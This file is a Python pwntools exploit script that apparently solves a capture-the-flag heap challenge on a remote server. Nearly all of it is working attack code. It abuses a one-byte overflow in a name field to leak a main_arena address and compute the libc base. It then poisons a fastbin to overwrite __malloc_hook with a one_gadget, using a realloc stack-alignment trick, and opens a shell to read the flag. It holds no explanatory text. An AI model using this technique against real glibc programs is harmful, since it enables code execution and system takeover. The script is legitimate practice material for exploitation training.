#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './pwn1'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)}) # 
# sh = process(execve_file)
sh = remote('39.106.184.130', 8090)
# elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $p=(char **)$rebase(0x202090)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Add(size):
    sh.sendlineafter('6.exit\n', '1')
    sh.sendlineafter('Input the size\n', str(size))

def Delete():
    sh.sendlineafter('6.exit\n', '2')

def Show():
    sh.sendlineafter('6.exit\n', '3')

def Update(name):
    sh.sendlineafter('6.exit\n', '4')
    sh.sendafter('Please input your name\n', name)

def Edit(content):
    sh.sendlineafter('6.exit\n', '5')
    sh.sendafter('Input the note\n', content)

sh.sendafter('Please input your name\n', 'a' * 0x30)
Add(0x88)
Add(0x18)
Update('b' * 0x30 + '\x10')
Delete()
Add(0x18)
Update('b' * 0x30 + '\x30')
Show()

result = sh.recvline()[:-1]
main_arena_addr = u64(result.ljust(8, '\0')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - 0x3c4b20
log.success('libc_addr: ' + hex(libc_addr))

Add(0x68)
Delete()
Add(0x18)
Update('b' * 0x30 + '\x30')
Edit(p64(main_arena_addr - 0x33))

Add(0x68)
Add(0x68)

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

onegadget_addr = libc_addr + 0x4526a
log.success('onegadget_addr: ' + hex(onegadget_addr))

'''
0x7ffff7a916c4 <realloc+4>     push   r13
0x7ffff7a916c6 <realloc+6>     push   r12
0x7ffff7a916c8 <realloc+8>     mov    r13, rsi
0x7ffff7a916cb <realloc+11>    push   rbp
0x7ffff7a916cc <realloc+12>    push   rbx
0x7ffff7a916cd <realloc+13>    mov    rbx, rdi
'''

Edit('b' * 0xb + p64(onegadget_addr) + p64(libc_addr + libc.symbols['realloc'] + 11))
# pause()
Add(8)

sh.sendline('cat flag')

sh.interactive()
clear()
